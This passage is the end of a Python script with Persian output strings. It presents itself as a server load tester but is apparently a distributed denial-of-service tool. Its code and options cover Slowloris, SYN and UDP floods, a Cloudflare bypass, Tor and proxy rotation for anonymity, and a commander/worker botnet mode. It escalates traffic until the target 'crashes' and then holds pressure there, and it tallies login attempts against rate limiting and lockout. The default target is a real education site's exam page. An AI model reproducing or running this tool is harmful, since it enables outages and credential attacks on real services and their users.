                recent = [r for r in self.stats._recent if now - r.ts < step_dur]
                error_rate = 0
                buf_full = False
                high_lat = False
                if recent:
                    fails = sum(1 for r in recent if not r.ok)
                    error_rate = fails / len(recent)
                    buf_full = any("BufFull" in (r.err or "") for r in recent[-100:])
                    avg_rt = sum(r.rt for r in recent) / len(recent)
                    high_lat = avg_rt > 10.0

                if (error_rate > 0.4 or buf_full or high_lat) and cur > step:
                    self.limit_hit = True
                    self.ceiling_workers = cur
                    reduction = max(int(cur * 0.15), step)
                    reason = "بافر پر" if buf_full else (f"خطا {error_rate:.0%}" if error_rate > 0.4 else "کندی شدید")
                    print(f"\n  {C.R}💥 سقف ({cur:,})! علت: {reason}{C.RS}")
                    for _ in range(reduction):
                        if all_tasks:
                            t = all_tasks.pop()
                            t.cancel()
                    cur -= reduction
                    self.peak_workers = cur
                elif self.limit_hit and self.ceiling_workers > 0 and cur < self.ceiling_workers:
                    to_add = min(int(step/4), self.ceiling_workers - cur)
                    if to_add > 0:
                        cur += to_add
                        print(f"\n  {C.G}🎯 فشار روی شکست ({cur:,}/{self.ceiling_workers:,}){C.RS}")
                        for _ in range(to_add):
                            self._spawn_worker(session, all_tasks, login_pct, page_pct,
                                               resource_pct, slowloris_pct, script_pct, http2_pct, pages, resources)
                elif cur < actual_max:
                    increment = step if error_rate <= 0.15 else int(step / 3)
                    new = min(increment, actual_max - cur)
                    if new > 0:
                        cur += new
                        print(f"\n  {C.M}📈 ↑ {C.BD}{cur:,}{C.RS}{C.M} ورکر{C.RS}")
                        for _ in range(new):
                            self._spawn_worker(session, all_tasks, login_pct, page_pct,
                                               resource_pct, slowloris_pct, script_pct, http2_pct, pages, resources)

                self.stats.users = cur
                step_t0 = time.time()
                while time.time() - step_t0 < step_dur and not self._stop.is_set():
                    rps = self.stats.rrps
                    hc = C.G if error_rate < 0.15 else (C.Y if error_rate < 0.4 else C.R)
                    mt = f"{C.R}CRASH{C.RS}" if self.limit_hit else f"{C.CY}SCALE{C.RS}"
                    cf_s = f" 🛡️{self.stats.cf_solved}" if self.enable_cfb else ""
                    print(
                        f"\r  {mt} │ {C.CY}{self.stats.dur:.0f}s{C.RS} │ "
                        f"👥{cur:,} │ 📊{self.stats.total:,} │ "
                        f"{C.G}✓{self.stats.ok:,}{C.RS} │ {C.R}✗{self.stats.fail:,}{C.RS} │ "
                        f"⚡{rps:.0f}/s │ {hc}H:{1-error_rate:.0%}{C.RS}{cf_s} │ "
                        f"⏳{step_dur-(time.time()-step_t0):.0f}s ",
                        end="", flush=True
                    )
                    await asyncio.sleep(1)
                self._snap()

            self._stop.set()
            if all_tasks:
                done, pending = await asyncio.wait(all_tasks, timeout=3)
                for t in pending: t.cancel()

    def _snap(self):
        self._snaps.append({
            "t": self.stats.dur, "total": self.stats.total,
            "ok": self.stats.ok, "fail": self.stats.fail,
            "rps": self.stats.rrps, "art": self.stats.rart,
            "users": self.stats.users, "rl": self.stats.rate_limited,
            "cap": self.stats.captcha, "cf": self.stats.cf_solved,
            "logins": self.stats.login_fail + self.stats.login_ok,
            "pages": self.stats.page_hits, "resources": self.stats.resource_hits,
            "slowloris": self.stats.slowloris_hits, "script": self.stats.script_hits,
        })


# ═══════════════════════════════════════════════════════════════════════════════
# گزارش
# ═══════════════════════════════════════════════════════════════════════════════

def report(st, url, snaps, tester):
    print(f"\n\n{'═'*72}")
    print(f"  {C.BD}{C.R}🔥 گزارش v3 — Ultimate{C.RS}")
    print(f"{'═'*72}")
    print(f"  هدف: {url}")
    if tester.detected_waf: print(f"  WAF: {tester.detected_waf.upper()}")
    if tester.enable_cfb: print(f"  CFB حل‌شده: {st.cf_solved}")
    print(f"{'─'*72}")

    print(f"\n  ┌─{C.BD} خلاصه {C.RS}─────────────────────────────────────────────")
    print(f"  │ مدت:       {st.dur:.1f}s ({st.dur/60:.1f} min)")
    print(f"  │ کل:        {st.total:,}")
    print(f"  │ ✓ موفق:    {C.G}{st.ok:,}{C.RS}")
    print(f"  │ ✗ خطا:     {C.R}{st.fail:,}{C.RS}")
    print(f"  │ RPS:       {st.rps:.1f}")
    if snaps: print(f"  │ Max RPS:   {max(s['rps'] for s in snaps):.1f}")
    print(f"  └────────────────────────────────────────────────────")

    logins = st.login_fail + st.login_ok
    print(f"\n  ┌─{C.BD} تفکیک {C.RS}───────────────────────────────────────────────")
    if st.total:
        print(f"  │ 🔐 لاگین:    {logins:,} ({logins/st.total*100:.1f}%)")
        print(f"  │ 📄 صفحه:     {st.page_hits:,} ({st.page_hits/st.total*100:.1f}%)")
        print(f"  │ 🖼️ منابع:    {st.resource_hits:,} ({st.resource_hits/st.total*100:.1f}%)")
        if st.slowloris_hits: print(f"  │ 🐌 Slow:    {st.slowloris_hits:,}")
        if st.script_hits: print(f"  │ 📜 Script:  {st.script_hits:,}")
        if st.cf_solved: print(f"  │ 🛡️ CF Bypass: {st.cf_solved:,}")
    print(f"  └────────────────────────────────────────────────────")

    print(f"\n  ┌─{C.BD}{C.R} امنیتی {C.RS}───────────────────────────────────────────")
    print(f"  │ Rate Limit: {'✅ فعال' if st.rate_limited > 0 else '❌ غیرفعال'}")
    print(f"  │ CAPTCHA:    {'✅ فعال' if st.captcha > 0 else '⚠ مشاهده نشد'}")
    print(f"  │ Lockout:    {'✅ فعال' if st.locked > 0 else '⚠ مشاهده نشد'}")
    print(f"  └────────────────────────────────────────────────────")

    if tester.proxy_manager:
        print(f"\n  ┌─{C.BD} پروکسی {C.RS}──────────────────────────────────────────────")
        print(f"  │ تعداد:     {len(tester.proxy_manager.proxies)}")
        print(f"  │ Tor:       {'✅ فعال' if tester.proxy_manager.tor_enabled else '❌'}")
        print(f"  └────────────────────────────────────────────────────")

    print(f"\n{'═'*72}\n")


# ═══════════════════════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════════════════════

DEFAULT_URL = "https://behsamooz.ir/student/run-descriptive-exam/dbe11389-6684-44d6-a2ce-8022f49a889b"

def parse_args():
    p = argparse.ArgumentParser(description="🔥 تست بار سرور v3 — Ultimate", formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--url", default=DEFAULT_URL, help="URL هدف")
    p.add_argument("--max-workers", type=int, default=100000)
    p.add_argument("--step", type=int, default=500)
    p.add_argument("--step-duration", type=int, default=3)
    p.add_argument("--timeout", type=int, default=20)
    p.add_argument("--safe-max", type=int, default=100000)

    # v3 ویژگی‌های جدید
    p.add_argument("--slowloris", action="store_true", help="فعال کردن Slowloris")
    p.add_argument("--cfb", action="store_true", help="Cloudflare Bypass")
    p.add_argument("--http2", action="store_true", help="استفاده از HTTP/2 (httpx)")
    p.add_argument("--tor", action="store_true", help="روت از Tor")
    p.add_argument("--proxy-file", default=None, help="فایل لیست پروکسی")
    p.add_argument("--syn-flood", action="store_true", help="SYN Flood (نیاز به root)")
    p.add_argument("--udp-flood", action="store_true", help="UDP Flood (نیاز به root)")
    p.add_argument("--syn-pps", type=int, default=5000, help="SYN packets/sec")
    p.add_argument("--udp-pps", type=int, default=5000, help="UDP packets/sec")
    p.add_argument("--script", default=None, help="فایل اسکریپت JSON")

    # Distributed
    p.add_argument("--commander", action="store_true", help="حالت Commander")
    p.add_argument("--worker", default=None, help="اتصال به Commander (ip:port)")
    p.add_argument("--port", type=int, default=DISTRIBUTED_PORT, help="پورت Commander")
    return p.parse_args()


async def main():
    args = parse_args()

    # حالت Distributed Worker
    if args.worker:
        worker = Worker(args.worker)
        if sys.platform != "win32":
            try:
                loop = asyncio.get_event_loop()
                for sig in (signal.SIGINT, signal.SIGTERM):
                    loop.add_signal_handler(sig, worker.stop)
            except Exception:
                pass
        await worker.start()
        return

    # حالت Commander
    if args.commander:
        commander = Commander(args.port)
        config = {
            'url': args.url,
            'max_workers': args.max_workers,
            'step': args.step,
            'step_dur': args.step_duration,
            'timeout': args.timeout,
            'safe_max': args.safe_max,
            'slowloris': args.slowloris,
            'cfb': args.cfb,
            'http2': args.http2,
            'tor': args.tor,
            'proxy_file': args.proxy_file,
            't0': time.time(),
        }
        if sys.platform != "win32":
            try:
                loop = asyncio.get_event_loop()
                for sig in (signal.SIGINT, signal.SIGTERM):
                    loop.add_signal_handler(sig, commander.stop)
            except Exception:
                pass
        await commander.start(config)
        return

    # حالت عادی
    print(f"\n  {C.CY}🎯 هدف: {C.W}{args.url}{C.RS}")
    print(f"  {C.CY}⌨  URL جدید وارد کنید یا Enter:{C.RS}")
    try:
        user_input = input(f"  {C.BD}>{C.RS} ").strip()
        target_url = user_input if user_input else args.url
    except KeyboardInterrupt:
        return

    if not target_url.startswith("http"):
        print(f"  {C.R}❌ URL نامعتبر{C.RS}")
        return

    # حملات Layer 3/4 (مستقل)
    if args.syn_flood or args.udp_flood:
        parsed = urlparse(target_url)
        target_ip = socket.gethostbyname(parsed.hostname)
        l34 = Layer34Attacker(target_ip, parsed.port or 80)

        if args.syn_flood:
            asyncio.create_task(l34.syn_flood(args.syn_pps))
        if args.udp_flood:
            asyncio.create_task(l34.udp_flood(args.udp_pps))

        print(f"  {C.R}💥 حملات Layer 3/4 فعال{C.RS}")
        print(f"  🛑 Ctrl+C برای توقف")
        try:
            while True:
                await asyncio.sleep(1)
                print(f"\r  SYN:{l34.stats['syn_sent']:,} UDP:{l34.stats['udp_sent']:,} ERR:{l34.stats['errors']:,}", end="", flush=True)
        except KeyboardInterrupt:
            l34.stop()
        return

    # تست بار Layer 7
    tester = CombinedTester(
        login_url=target_url,
        timeout=args.timeout,
        safe_max=args.safe_max,
        enable_slowloris=args.slowloris,
        enable_cfb=args.cfb,
        enable_http2=args.http2,
        tor_enabled=args.tor,
        proxy_file=args.proxy_file,
        script_path=args.script,
    )

    if sys.platform != "win32":
        try:
            loop = asyncio.get_event_loop()
            for sig in (signal.SIGINT, signal.SIGTERM):
                loop.add_signal_handler(sig, tester.stop)
        except Exception:
            pass

    try:
        await tester.run(max_workers=args.max_workers, step=args.step, step_dur=args.step_duration)
    except KeyboardInterrupt:
        tester.stop()
        print(f"\n\n  {C.Y}⚠ Ctrl+C{C.RS}")
    except Exception as e:
        print(f"\n  {C.R}❌ {e}{C.RS}")
    finally:
        report(tester.stats, target_url, tester._snaps, tester)

        # ذخیره JSON
        try:
            data = {
                "target": target_url, "waf": tester.detected_waf,
                "duration": tester.stats.dur, "total": tester.stats.total,
                "ok": tester.stats.ok, "fail": tester.stats.fail,
                "cf_solved": tester.stats.cf_solved,
                "timeline": tester._snaps,
            }
            with open("load_test_report.json", "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception:
            pass


if __name__ == "__main__":
    asyncio.run(main())
